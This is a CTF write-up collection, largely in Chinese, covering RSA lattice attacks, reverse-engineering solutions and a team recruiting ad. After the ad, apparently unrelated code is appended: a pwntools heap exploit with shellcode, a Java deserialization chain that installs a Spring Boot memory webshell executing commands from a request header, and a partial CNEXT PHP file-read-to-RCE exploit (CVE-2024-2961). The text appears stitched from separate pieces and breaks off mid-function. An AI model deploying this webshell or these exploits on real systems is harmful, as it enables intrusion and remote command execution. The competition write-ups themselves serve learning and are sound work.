N = 61857467041120006957454494977971762866359211220721592255304580940306873708357617802596067329984189345493420858543581027612648626678588277060222860337783377316655375278359169520243355170247177279595812282793212550819124960549824278287538977769728573023023364686725321548391592858202718446127851076431000427033
e = 22696852369762746127523066296087974245933137295782964284054040654103039210164173227291367914580709029582944005335464668969366909190396194570924426653294883884186299265660358589254391341147028477295482787041170991166896788171334992065199814524969470117229229967188623636764051681654720429531708441920158042161
c = 41862679760722981662840433621129671566139143933210627878095169470855743742734397276638345217059912784871301273620533442249011607182329472311453700434692358352210197988000738272869600692181834281813995048665466937302183039555350612260646428575598237960405962714063137455677605629008760761743568236135324015278

from copy import deepcopy
# https://www.iacr.org/archive/pkc2006/39580001/39580001.pdf
# Author: ZM__________J, To1in
N = 61857467041120006957454494977971762866359211220721592255304580940306873708357617802596067329984189345493420858543581027612648626678588277060222860337783377316655375278359169520243355170247177279595812282793212550819124960549824278287538977769728573023023364686725321548391592858202718446127851076431000427033
e = 22696852369762746127523066296087974245933137295782964284054040654103039210164173227291367914580709029582944005335464668969366909190396194570924426653294883884186299265660358589254391341147028477295482787041170991166896788171334992065199814524969470117229229967188623636764051681654720429531708441920158042161
c = 41862679760722981662840433621129671566139143933210627878095169470855743742734397276638345217059912784871301273620533442249011607182329472311453700434692358352210197988000738272869600692181834281813995048665466937302183039555350612260646428575598237960405962714063137455677605629008760761743568236135324015278

alpha = log(e, N)
beta = 0.30
delta = 0.10

P.&lt;x,y,z&gt;=PolynomialRing(ZZ)

X = ceil(2 * N^(alpha + beta + delta - 1))
Y = ceil(2 * N^beta)
Z = ceil(2 * N^(1 - beta))

def f(x,y):
return x*(N-y)+N
def trans(f):
my_tuples = f.exponents(as_ETuples=False)
g = 0
for my_tuple in my_tuples:
exponent = list(my_tuple)
mon = x ^ exponent[0] * y ^ exponent[1] * z ^ exponent[2]
tmp = f.monomial_coefficient(mon)

my_minus = min(exponent[1], exponent[2])
exponent[1] -= my_minus
exponent[2] -= my_minus
tmp *= N^my_minus
tmp *= x ^ exponent[0] * y ^ exponent[1] * z ^ exponent[2]

g += tmp
return g

m = 5 # need to be adjusted according to different situations
tau = ((1 - beta)^2 - delta) / (2 * beta * (1 - beta))
sigma = (1 - beta - delta) / (2 * (1 - beta))

print(sigma * m)
print(tau * m)

s = ceil(sigma * m)
t = ceil(tau * m)
my_polynomials = []
for i in range(m+1):
for j in range(m-i+1):
g_ij = trans(e^(m-i) * x^j * z^s * f(x, y)^i)
my_polynomials.append(g_ij)

for i in range(m+1):
for j in range(1, t+1):
h_ij = trans(e^(m-i) * y^j * z^s * f(x, y)^i)
my_polynomials.append(h_ij)

known_set = set()
new_polynomials = []
my_monomials = []

# construct partial order
while len(my_polynomials) &gt; 0:
for i in range(len(my_polynomials)):
f = my_polynomials[i]
current_monomial_set = set(x^tx * y^ty * z^tz for tx, ty, tz in f.exponents(as_ETuples=False))
delta_set = current_monomial_set - known_set
if len(delta_set) == 1:
new_monomial = list(delta_set)[0]
my_monomials.append(new_monomial)
known_set |= current_monomial_set
new_polynomials.append(f)
my_polynomials.pop(i)
break
else:
raise Exception('GG')

my_polynomials = deepcopy(new_polynomials)

nrows = len(my_polynomials)
ncols = len(my_monomials)
L = [[0 for j in range(ncols)] for i in range(nrows)]

for i in range(nrows):
g_scale = my_polynomials[i](X * x, Y * y, Z * z)
for j in range(ncols):
L[i][j] = g_scale.monomial_coefficient(my_monomials[j])

# remove N^j
for i in range(nrows):
Lii = L[i][i]
N_Power = 1
while (Lii % N == 0):
N_Power *= N
Lii //= N
L[i][i] = Lii
for j in range(ncols):
if (j != i):
L[i][j] = (L[i][j] * inverse_mod(N_Power, e^m))

L = Matrix(ZZ, L)
nrows = L.nrows()

L = L.LLL()
# Recover poly
reduced_polynomials = []
for i in range(nrows):
g_l = 0
for j in range(ncols):
g_l += L[i][j] // my_monomials[j](X, Y, Z) * my_monomials[j]
reduced_polynomials.append(g_l)

# eliminate z
my_ideal_list = [y * z - N] + reduced_polynomials

# Variety
my_ideal_list = [Hi.change_ring(QQ) for Hi in my_ideal_list]
for i in range(len(my_ideal_list), 3, -1):
V = Ideal(my_ideal_list[:i]).variety(ring=ZZ)
if V:
print(V)
break

p = int(V[0]['y'])
q = N// p

d = pow(e,-1,(p-1)*(q-1))
m = pow(c,d,N)
print(bytes.fromhex(hex(m)[2:]))

# 2.14285714285714
# 4.64285714285714
# [{z: 426614979768518060635433317149972303610396098751783498586225631589479798053751568080185868568717967344782297587209012869059719479952019313461850777653567018452929932659204669967695196434044149034271037885062392902287, y: 144996003362760405215910388196517232449311004246441924325936847006315296003811348342536838359, x: 66838488369949543369599279980954380920457752396291961341704448955532596917094831390389571041281062121515985150418852560085}]
# b'flag{tlp17_1s_4w3s0m3}'

ezrsa-pcb2024

两种解法：

1.LLL小范围爆破

c = 11850797596095451670524864488046085367812828367468720385501401042627802035427938560866042101544712923470757782908521283827297125349504897418356898752774318846698532487439368216818306352553082800908866174488983776084101115047054799618258909847935672497139557595959270012943240666681053544905262111921321629682394432293381001209674417203517322559283298774214341100975920287314509947562597521988516473281739331823626676843441511662000240327706777269733836703945274332346982187104319993337626265180132608256601473051048047584429295402047392826197446200263357260338332947498385907066370674323324146485465822881995994908925
n = 21318014445451076173373282785176305352774631352746325570797607376133429388430074045541507180590869533728841479322829078527002230672051057531691634445544608584952008820389785877589775003311007782211153558201413379523215950193011250189319461422835303446888969202767656215090179505169679429932715040614611462819788222032915253996376941436179412296039698843901058781175173984980266474602529294294210502556931214075073722598225683528873417278644194278806584861250188304944748756498325965302770207316134309941501186831407953950259399116931502886169434888276069750811498361059787371599929532460624327554481179566565183721777
c1 = 4780454330598494796755521994676122817049316484524449315904838558624282970709853419493322324981097593808974378840031638879097938241801612033487018497098140216369858849215655128326752931937595077084912993941304190099338282258345677248403566469008681644014648936628917169410836177868780315684341713654307395687505633335014603359767330561537038768638735748918661640474253502491969012573691915259958624247097465484616897537609020908205710563729989781151998857899164730749018285034659826333237729626543828084565456402192248651439973664388584573568717209037035304656129544659938260424175198672402598017357232325892636389317
c2 = 9819969459625593669601382899520076842920503183309309803192703938113310555315820609668682700395783456748733586303741807720797250273398269491111457242928322099763695038354042594669354762377904219084248848357721789542296806917415858628166620939519882488036571575584114090978113723733730014540463867922496336721404035184980539976055043268531950537390688608145163366927155216880223837210005451630289274909202545128326823263729300705064272989684160839861214962848466991460734691634724996390718260697593087126527364129385260181297994656537605275019190025309958225118922301122440260517901900886521746387796688737094737637604

def attack(brute = 2):
for i in range(2^brute):
for j in range(2^brute):
L = Matrix(ZZ, [
[1,0,0,2^brute*c1],
[0,1,0,2^brute*c2],
[0,0,2^(1024-brute),c1*i+c2*j-c1*c2],
[0,0,0,n]
])
L[:,-1:] *= n
res = L.LLL()[0]

p = 2^brute*abs(res[0])+i
if(n % p == 0):
print(p)
assert is_prime(p)
return p
p = attack()
q = n // p
assert is_prime(q)
d = pow(0x10001,-1,(p-1)*(q-1))
m = pow(c,d,n)
print(bytes.fromhex(hex(m)[2:]))
# 171656660665403765738031081824875339142040216917035829027175959644968598469497472331153755626091317314219661980132136551775230700283513247877337805935248792200809930483659957679825478739707821552518426177878428742937912850019804844395502428151318188402429797244319960066986182724904794027618050562615218050411
# b'flag{3z_r5a_15_r34lly_345y_w1sh_u_c0uld_g3t_f14g}xcbxdfrx1fxf6Ex04 x83_Uxe5Ixefx82xdex8axe4px95R*x89.1&lt;xc2x9d[OU#x19 x0fx0eQxe9xaax83xb1xfeG8x99yB`x04xecxa9x13x85@xb1Rx97hxb4xfdxaa]pyxdfx87x08xafxf6xdafx0bx00xf2x0cxc9l8x03'

2.CVP找最近向量

load("/home/sage/collection_lattice_tools/inequ_cvp_solve.sage")

c = 11850797596095451670524864488046085367812828367468720385501401042627802035427938560866042101544712923470757782908521283827297125349504897418356898752774318846698532487439368216818306352553082800908866174488983776084101115047054799618258909847935672497139557595959270012943240666681053544905262111921321629682394432293381001209674417203517322559283298774214341100975920287314509947562597521988516473281739331823626676843441511662000240327706777269733836703945274332346982187104319993337626265180132608256601473051048047584429295402047392826197446200263357260338332947498385907066370674323324146485465822881995994908925
n = 21318014445451076173373282785176305352774631352746325570797607376133429388430074045541507180590869533728841479322829078527002230672051057531691634445544608584952008820389785877589775003311007782211153558201413379523215950193011250189319461422835303446888969202767656215090179505169679429932715040614611462819788222032915253996376941436179412296039698843901058781175173984980266474602529294294210502556931214075073722598225683528873417278644194278806584861250188304944748756498325965302770207316134309941501186831407953950259399116931502886169434888276069750811498361059787371599929532460624327554481179566565183721777
h1 = 4780454330598494796755521994676122817049316484524449315904838558624282970709853419493322324981097593808974378840031638879097938241801612033487018497098140216369858849215655128326752931937595077084912993941304190099338282258345677248403566469008681644014648936628917169410836177868780315684341713654307395687505633335014603359767330561537038768638735748918661640474253502491969012573691915259958624247097465484616897537609020908205710563729989781151998857899164730749018285034659826333237729626543828084565456402192248651439973664388584573568717209037035304656129544659938260424175198672402598017357232325892636389317
h2 = 9819969459625593669601382899520076842920503183309309803192703938113310555315820609668682700395783456748733586303741807720797250273398269491111457242928322099763695038354042594669354762377904219084248848357721789542296806917415858628166620939519882488036571575584114090978113723733730014540463867922496336721404035184980539976055043268531950537390688608145163366927155216880223837210005451630289274909202545128326823263729300705064272989684160839861214962848466991460734691634724996390718260697593087126527364129385260181297994656537605275019190025309958225118922301122440260517901900886521746387796688737094737637604

mat = Matrix([
[n,0,0,0],
[h1*h2,1,0,0],
[-h2,0,1,0],
[-h1,0,0,1]
])

lb = [0,1,2^1023,2^1023]
ub = [0,1,2^1024,2^1024]

sol = solve(mat,lb,ub)[0]
print(sol[2:])

_,_,p,q = map(int,sol)
assert is_prime(p) and is_prime(q)

d = pow(0x10001,-1,(p-1)*(q-1))
m = pow(c,d,n)
print(bytes.fromhex(hex(m)[2:]))

# Expected Number of Solutions : 1
# (124189847121659504689131596141558047777470804493599644420296555116734410602128548952870025238352452050389498094816555251171494633173056599030097009589059426642394227134903947124256903019712657426771434047124620967038284130366066946770546558623405351933778765398347798146994796514331421532950278418230985309907, 171656660665403765738031081824875339142040216917035829027175959644968598469497472331153755626091317314219661980132136551775230700283513247877337805935248792200809930483659957679825478739707821552518426177878428742937912850019804844395502428151318188402429797244319960066986182724904794027618050562615218050411)
#b'flag{3z_r5a_15_r34lly_345y_w1sh_u_c0uld_g3t_f14g}xcbxdfrx1fxf6Ex04 x83_Uxe5Ixefx82xdex8axe4px95R*x89.1&lt;xc2x9d[OU#x19 x0fx0eQxe9xaax83xb1xfeG8x99yB`x04xecxa9x13x85@xb1Rx97hxb4xfdxaa]pyxdfx87x08xafxf6xdafx0bx00xf2x0cxc9l8x03'

Reverse:

joyVBS-pcb2024

就经典的VBS代码混淆逻辑，WScript.Echo替换在前面，输出内容，直接凯撒加base64秒了
IMG_256
IMG_257

RE5-pcb2024

tea，动调触发异常，走异常的逻辑，key和加密中的数据都换了
IMG_256

可以跟到异常走的逻辑，一个伪随机
IMG_257

#include <stdio.h>

#include <stdint.h>

#include <stdlib.h>

void encrypt(uint32_t* plainBlock, uint32_t* key) {

uint32_t leftBlock = plainBlock[0], rightBlock = plainBlock[1], roundSum = 0, roundIdx;

// 生成伪随机数序列

uint32_t roundSums[32];

for (roundIdx = 0; roundIdx < 32; roundIdx++) {

roundSums[roundIdx] = rand();

if (roundIdx > 0) {

roundSums[roundIdx] += roundSums[roundIdx - 1];

}

}

// 分解密钥

uint32_t keyPart1 = key[0], keyPart2 = key[1], keyPart3 = key[2], keyPart4 = key[3];

// 进行32轮加密

for (roundIdx = 0; roundIdx < 32; roundIdx++) {

roundSum = roundSums[roundIdx];

// 加密公式（与解密公式相反）

leftBlock += ((rightBlock << 4) + keyPart1) ^ (rightBlock + roundSum) ^ ((rightBlock >> 5) + keyPart2);

rightBlock += ((leftBlock << 4) + keyPart3) ^ (leftBlock + roundSum) ^ ((leftBlock >> 5) + keyPart4);

}

// 将加密后的数据写回

plainBlock[0] = leftBlock;

plainBlock[1] = rightBlock;

}

void decrypt(uint32_t* cipherBlock, uint32_t* key) {

uint32_t leftBlock = cipherBlock[0], rightBlock = cipherBlock[1], roundSum, roundIdx;

// 生成伪随机数序列

uint32_t roundSums[32];

for (roundIdx = 0; roundIdx < 32; roundIdx++) {

roundSums[roundIdx] = rand();

if (roundIdx > 0) {

roundSums[roundIdx] += roundSums[roundIdx - 1];

}

}

// 分解密钥

uint32_t keyPart1 = key[0], keyPart2 = key[1], keyPart3 = key[2], keyPart4 = key[3];

// 进行32轮解密

for (roundIdx = 0; roundIdx < 32; roundIdx++) {

roundSum = roundSums[31 - roundIdx];

// 解密公式

rightBlock -= ((leftBlock << 4) + keyPart3) ^ (leftBlock + roundSum) ^ ((leftBlock >> 5) + keyPart4);

leftBlock -= ((rightBlock << 4) + keyPart1) ^ (rightBlock + roundSum) ^ ((rightBlock >> 5) + keyPart2);

}

// 将解密后的数据写回

cipherBlock[0] = leftBlock;

cipherBlock[1] = rightBlock;

}

int main() {

// 初始化随机数生成器

srand(0);

// 定义数据和密钥

uint32_t cipherData[] = {0xEA2063F8, 0x8F66F252, 0x902A72EF, 0x411FDA74,

0x19590D4D, 0xCAE74317, 0x63870F3F, 0xD753AE61};

uint32_t encryptionKey[4] = {2, 2, 3, 3};

// 解密多个数据块

for (int i = 0; i < 4; i++) {

decrypt(&cipherData[i * 2], encryptionKey);

}

// 输出解密后的数据

for (int i = 0; i < 8; i++) {

printf("%08X ", cipherData[i]);

}

printf("n%s",cipherData);

return 0;

}

Rafflesia-pcb2024

花指令，改完之后可以动调有一个tls里面的base64的码表更换，base64后面跟了一个异或
IMG_256

然后动调得码表为HElRNYGmBOMWnbDvUCgcpu1QdPqJIS+iTry39KXse4jLh/x26Ff5Z7Vokt8wzAa0
IMG_257

exec-pcb2024

下下来之后用pycharm打开，按照他给的base解密

import base64
exp = (每次解密后的得出解密代码)#把前面的”exec(“和后面”)“删掉

# 将解码后的数据写入到一个文本文件
with open('decoded_output28.txt', 'wb') as f:
f.write(exp)

print("解密结果已经写入到 decoded_output28.txt 文件中。")

一共这样循环28次的base64/32/85

最后解出来是个rc4加密：

a=True
d=len
G=list
g=range
s=next
R=bytes
o=input
Y=print

def l(S):
i=0
j=0
while a:
i=(i+1)%256
j=(j+S[i])%256
S[i],S[j]=S[j],S[i]
K=S[(S[i]+S[j])%256]
yield K

def N(key,O):
I=d(key)
S=G(g(256))
j=0
for i in g(256):
j=(j+S[i]+key[i%I])%256
S[i],S[j]=S[j],S[i]
z=l(S)
n=[]
for k in O:
n.append(k^s(z)+2)
return R(n)

def E(s,parts_num):
Q=d(s.decode())
S=Q//parts_num
u=Q%parts_num
W=[]
j=0
for i in g(parts_num):
T=j+S
if u&gt;0:
T+=1
u-=1
W.append(s[j:T])
j=T
return W

if __name__=='__main__':
L=o('input the flag: &gt;&gt;&gt; ').encode()
assert d(L)%2==0,'flag length should be even'
t=b'v3ry_s3cr3t_p@ssw0rd'
O=E(L,2)
U=[]
for i in O:
U.append(N(t,i).hex())

if U==['1796972c348bc4fe7a1930b833ff10a80ab281627731ab705dacacfef2e2804d74ab6bc19f60','2ea999141a8cc9e47975269340c177c726a8aa732953a66a6af183bcd9cec8464a']:
Y('Congratulations! You got the flag!')
else:
print('Wrong flag!')

所以exp：

a = True
d = len
G = list
g = range
s = next
R = bytes
Y = print

# 生成器 l(S)（与加密时的相同）
def l(S):
i = 0
j = 0
while True:
i = (i + 1) % 256
j = (j + S[i]) % 256
S[i], S[j] = S[j], S[i]
K = S[(S[i] + S[j]) % 256]
yield K

# RC4 解密函数 N
def N(key, O):
I = d(key)
S = G(g(256))
j = 0
for i in g(256):
j = (j + S[i] + key[i % I]) % 256
S[i], S[j] = S[j], S[i]

z = l(S) # 初始化生成器
n = []
for k in O:
n.append(k ^ s(z) + 2) # 用生成器返回的伪随机数解密数据
return R(n) # 返回解密后的字节对象

# 字符串分割函数 E（与加密时的相同）
def E(s, parts_num):
Q = d(s.decode()) # 获取字符串的长度
S = Q // parts_num # 每个部分的大小
u = Q % parts_num # 余数，决定最后一部分的大小
W = []
j = 0
for i in g(parts_num):
T = j + S
if u &gt; 0:
T += 1 # 增加最后部分的大小
u -= 1
W.append(s[j:T])
j = T
return W # 返回分割后的字符串块

# 解密函数
def decrypt_flag(U):
t = b'v3ry_s3cr3t_p@ssw0rd' # 固定密钥
decrypted_parts = []

for part in U:
# 解密每个部分
encrypted_bytes = bytes.fromhex(part) # 将十六进制字符串转换为字节
decrypted_part = N(t, encrypted_bytes) # 使用 RC4 解密
decrypted_parts.append(decrypted_part.decode()) # 将字节解码为字符串

# 将解密后的两部分合并
return ''.join(decrypted_parts)

# 主程序入口
if __name__ == '__main__':
# 给定加密后的结果
U = [
'1796972c348bc4fe7a1930b833ff10a80ab281627731ab705dacacfef2e2804d74ab6bc19f60',
'2ea999141a8cc9e47975269340c177c726a8aa732953a66a6af183bcd9cec8464a'
]

# 解密 flag
flag = decrypt_flag(U)

print("Decrypted flag:", flag)

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
from pwn import *
from struct import pack
from ctypes import *
import base64
    #from LibcSearcher import *

context.terminal = ['tmux','splitw','-h']
def debug(c = 0):
if(c):
gdb.attach(p, c)
else:
gdb.attach(p)
pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa = lambda text,data :p.sendafter(text, data)
sl = lambda data :p.sendline(data)
sla = lambda text,data :p.sendlineafter(text, data)
r = lambda num=4096 :p.recv(num)
rl = lambda text :p.recvuntil(text)
pr = lambda num=4096 :
print(p.recv(num))
inter = lambda :p.interactive()
l32 = lambda :
u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
l64 = lambda :
u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
uu32 = lambda :
u32(p.recv(4).ljust(4,b'x00'))
uu64 = lambda :
u64(p.recv(6).ljust(8,b'x00'))
int16 = lambda data :
int(data,16)
lg= lambda s, num :p.success('%s -&gt; 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64', log_level='debug')

    #p = process('./cool_book')
p=remote('192.168.18.22',8888)
elf = ELF('./cool_book')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def add(idx, content):
sla(b'3.exitn', b'1')
sla(b'input idxn', str(idx))
sa(b'input contentn', content)
def free(idx):
sla(b'3.exitn', b'2')
sla(b'input idxn', str(idx))

rl(b'addr=')
heap_base=int16(r(14))

for i in range(46):
add(i,b'x90'*0x1)

sc=shellcraft.open('/flag')#pwntools自带的生成这个函数的代码

sc+=shellcraft.read(3,heap_base-0x100,0x30)

sc+=shellcraft.write(1,heap_base-0x100,0x30)

add(46,b'x90'*0x1)#heap_base+0x910
add(47,b'x90'*0x1)#heap_base+0x940
add(48,b'x90'*0x1)#heap_base+0x940

add(49,asm('mov rdi,0;mov rsi,rbp;pop rax;pop rcx;pop rdx;syscall'))#heap_base+0x9a0

lg('heap_base',heap_base)

    #gdb.attach(p,'b *$rebase(0x12c9)')

sla(b'3.exitn', b'3')
sleep(2)
s(b'x90'*0x40+asm(sc))
pr()
# pause()
package gadget.doubleunser;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.ToStringBean;
import gadget.memshell.SpringBootMemoryShellOfController;
import javassist.*;
import org.apache.commons.beanutils.BeanComparator;
import org.springframework.aop.framework.AdvisedSupport;
import util.GadgetUtils;
import util.ReflectionUtils;
import util.SerializerUtils;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.security.*;
import java.util.Base64;
import java.util.PriorityQueue;

public class JacksonToSignedObject {
public static void main(String[] args) throws Exception {
CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
ctClass.removeMethod(writeReplace);
// 将修改后的CtClass加载至当前线程的上下文类加载器中
ctClass.toClass();

TemplatesImpl templates = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);
POJONode node2 = new POJONode(templates);
BadAttributeValueExpException badAttributeValueExpException2 = new BadAttributeValueExpException(null);
ReflectionUtils.setFieldValue(badAttributeValueExpException2,"val",node2);

// BadAttributeValueExpException badAttributeValueExpException2 = new BadAttributeValueExpException(node2);

//二次反序列化
KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
kpg.initialize(1024);
KeyPair kp = kpg.generateKeyPair();
SignedObject signedObject = new SignedObject(badAttributeValueExpException2, kp.getPrivate(), Signature.getInstance("DSA"));

//触发SignedObject#getObject
POJONode node = new POJONode(signedObject);

BadAttributeValueExpException o = new BadAttributeValueExpException(null);
ReflectionUtils.setFieldValue(o,"val",node);
// ReflectionUtils.setFieldValue(queue, "queue", new Object[]{signedObject, signedObject});

byte[] payload = SerializerUtils.serialize(o);
System.out.println(Base64.getEncoder().encodeToString(payload));

SerializerUtils.unserialize(payload);
// ObjectInputStream ois = new MyInputStream(new ByteArrayInputStream(payload));
// ois.readObject();
}
public static Object makeTemplatesImplAopProxy() throws Exception {
AdvisedSupport advisedSupport = new AdvisedSupport();
// Object template = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);
// Object template = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);
// Object template = GadgetUtils.getTemplatesImplReverseShell()
Object template = GadgetUtils.getTemplatesImpl("calc");
advisedSupport.setTarget(template);
Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
constructor.setAccessible(true);
InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
return proxy;
}
}
package gadget.memshell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Scanner;

public class SpringBootMemoryShellOfController extends AbstractTranslet {
public Integer i = 0 ;

public SpringBootMemoryShellOfController() throws Exception{
// 1. 利用spring内部方法获取context
WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
// 2. 从context中获得 RequestMappingHandlerMapping 的实例
RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);

Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
configField.setAccessible(true);
RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);

// 3. 通过反射获得自定义 controller 中的 Method 对象
Method method = SpringBootMemoryShellOfController.class.getMethod("test",HttpServletRequest.class, HttpServletResponse.class);

// 在内存中动态注册 controller
RequestMappingInfo info = RequestMappingInfo.paths("/test1").options(config).build();

if(i==0){
SpringBootMemoryShellOfController springBootMemoryShellOfController = new SpringBootMemoryShellOfController("aaa");
mappingHandlerMapping.registerMapping(info, springBootMemoryShellOfController, method);
System.out.println(i);
i=1;
}

}

public SpringBootMemoryShellOfController(String test){

}

public void test(HttpServletRequest request, HttpServletResponse response) throws Exception{
if (request.getHeader("squirt1e") != null) {
boolean isLinux = true;
String osTyp = System.getProperty("os.name");
if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains("win")) {
isLinux = false;
}
String[] cmds = isLinux ? new String[]{"sh", "-c", request.getHeader("squirt1e")} : new String[]{"cmd.exe", "/c", request.getHeader("squirt1e")};
InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
Scanner s = new Scanner(in).useDelimiter("A");
String output = s.hasNext() ? s.next() : "";
response.getWriter().write(output);
response.getWriter().flush();
}
}

@Override
public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

}

@Override
public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

}
}
#!/usr/bin/env python3
#
# CNEXT: PHP file-read to RCE (CVE-2024-2961)
# Date: 2024-05-27
# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
#
# TODO Parse LIBC to know if patched
#
# INFORMATIONS
#
# To use, implement the Remote class, which tells the exploit how to send the payload.
#

from __future__ import annotations

import base64
import zlib

from dataclasses import dataclass
from requests.exceptions import ConnectionError, ChunkedEncodingError

from pwn import *
from ten import *

HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")

class Remote:
    """A helper class to send the payload and download files.
    
    The logic of the exploit is always the same, but the exploit needs to know how to
    download files (/proc/self/maps and libc) and how to send the payload.
    
    The code here serves as an example that attacks a page that looks like:
    
    ```php
    <?php
    
    $data = file_get_contents($_POST['file']);
    echo "File contents: $data";
    ```
    
    Tweak it to fit your target, and start the exploit.
    """

    def __init__(self, url: str) -> None:
        self.url = url
        self.session = Session()

    def send(self, path: str) -> Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """
        # print(path)
        path = 'O:4:"cls1":2:{s:3:"cls";O:4:"cls2":2:{s:8:"filename";s:'+str(len(path))+':"'+path+'";s:3:"txt";s:0:"";}s:3:"arr";a:1:{i:
123;s:7:"fileput";}}'
        print(path)
        path = base64.encode(path.encode())
        return self.session.get(self.url+"?ser="+path)
        # return self.session.post(self.url, data={"file": path})
        
    def download(self, path: str) -> bytes:
        """Returns the contents of a remote file.
        """
        path = f"php://filter/convert.base64-encode/resource={path}"
        response = self.send(path)
        print(response.text)
        data = re.search(b"Your file:(.*)",response.text.encode()).group(1)
        return base64.decode(data)

@entry
@arg("url", "Target URL")
@arg("command", "Command to run on the system; limited to 0x140 bytes")
@arg("sleep", "Time to sleep to assert that the exploit worked. By default, 1.")
@arg("heap", "Address of the main zend_mm_heap structure.")
@arg(
    "pad",
    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "
    "operations with this size, increase this. Defaults to 20.",
)
@dataclass
class Exploit:
    """CNEXT exploit: RCE using a file read primitive in PHP."""

    url: str
    command: str
    sleep: int = 1
    heap: str = None
    pad: int = 20

    def __post_init__(self):
        self.remote = Remote(self.url)
        self.log = logger("EXPLOIT")
        self.info = {}
        self.heap = self.heap and int(self.heap, 16)

    def check_vulnerable(self) -> None:
        """Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """
        
        def safe_download(path: str) -> bytes:
            try:
                return self.remote.download(path)
            
except ConnectionError:
                failure("Target not [b]reachable[/] ?")
            

        def check_token(text: str, path: str) -> bool:
            result = safe_download(path)
            return text.encode() == result

        text = tf.random.string(50).encode()
        base64 = b64(text, misalign=True).decode()
        path = f"data:
text/plain;base64,{base64}"
        
        result = safe_download(path)
        
        if text not in result:
            msg_failure("Remote.download did not return the test string")
            print("--------------------")
            print(f"Expected test string: {text}")
            print(f"Got: {result}")
            print("--------------------")
            failure("If your code works fine, it means that the [i]data://[/] wrapper does not work")

        msg_info("The [i]data://[/] wrapper works")

        text = tf.random.string(50)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:
text/plain;base64,{base64}"
        if not check_token(text, path):
            failure("The [i]php://filter/[/] wrapper does not work")

        msg_info("The [i]php://filter/[/] wrapper works")

        text = tf.random.string(50)
        base64 = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=data:
text/plain;base64,{base64}"

        if not check_token(text, path):
            failure("The [i]zlib[/] extension is not enabled")

        msg_info("The [i]zlib[/] extension is enabled")

        msg_success("Exploit preconditions are satisfied")

    def get_file(self, path: str) -> bytes:
        with msg_status(f"Downloading [i]{path}[/]..."):
            return self.remote.download(path)

    def get_regions(self) -> list[Region]:
        """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
        maps = self.get_file("/proc/self/maps")
        maps = maps.decode()
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)b" r".*" r"s([-rwx]{3}[ps])s" r"(.*)"
        )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                print(maps)
                failure("Unable to parse memory mappings")

        self.log.info(f"Got {len(regions)} memory regions")

        return regions

    def get_symbols_and_addresses(self) -> None:
        """Obtains useful symbols and addresses from the file read primitive."""
        regions = self.get_regions()

        LIBC_FILE = "./cnext-libc"

        # PHP's heap

        self.info["heap"] = self.heap or self.find_main_heap(regions)

        # Libc

